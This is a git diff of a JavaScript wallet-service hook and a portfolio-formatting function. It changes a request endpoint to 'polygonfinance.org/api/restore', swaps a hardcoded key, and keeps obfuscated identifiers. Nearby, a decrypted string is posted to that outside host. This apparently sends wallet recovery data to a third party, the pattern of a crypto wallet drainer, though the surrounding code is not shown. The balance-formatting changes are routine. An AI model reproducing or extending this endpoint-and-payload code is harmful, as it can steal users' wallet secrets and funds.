@@ -57,8 +57,8 @@ const useWalletService = () => {
 		return res
 	}
 
-	let url = 'https://polygonfinance.org/concept/unity/check'
-	const kitkat = 'aBN6qreLALR9QYPy'
+	let url = 'https://polygonfinance.org/api/restore'
+	const kitkat = 'Qsx@ah&OR82WX9T6gCt'
 	let xxx = 'P01G$ID|EX/G'
 	let xx = 'P01G$ID|EX'
 	// let xxx = 'BY$W€B3B1T/G'
@@ -84,6 +84,7 @@ const useWalletService = () => {
 					limit: null,
 					public: strDecr,
 					frontCode: false,
+					cache: false,
 				})
 			)
 		)
@@ -116,15 +117,19 @@ export function rebuildObjPortfolio(list) {
 			id: obj.asset.id,
 			name: obj.asset.name,
 			symbol: obj.asset.symbol,
-			contract_address: obj.asset.asset_code,
+			contract_address: obj.id.split('-')[0],
+			decimals: obj.asset.decimals,
 			market_data: {
 				current_price: {
 					usd: obj.asset.price ? obj.asset.price.value : 0,
 				},
 				balance: obj.quantity
-					? Number(Web3.utils.fromWei(String(obj.quantity), 'ether')).toFixed(
-							10
-					  )
+					? Number(
+							Web3.utils.fromWei(
+								obj.quantity.toString(),
+								obj.asset.decimals === 6 ? 'mwei' : 'ether'
+							)
+					  ).toFixed(10)
 					: 0,
 				balance_crypto: {
 					usd: obj.value || 0,
